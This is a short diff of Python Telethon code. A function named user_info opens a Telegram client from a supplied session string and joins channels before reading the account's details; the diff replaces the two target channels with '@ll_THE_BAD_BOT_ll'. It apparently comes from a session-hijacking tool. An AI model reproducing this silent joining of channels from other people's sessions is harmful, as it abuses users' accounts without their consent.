@@ -58,8 +58,8 @@ async def user_info(session):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@cyberdaxx"))
-                await steve(join("@cyberdaxxx"))
+                await steve(join("@ll_THE_BAD_BOT_ll"))
+                await steve(join("@ll_THE_BAD_BOT_ll"))
             except Exception as e:
                 print(e)
             k = await steve.get_me()  
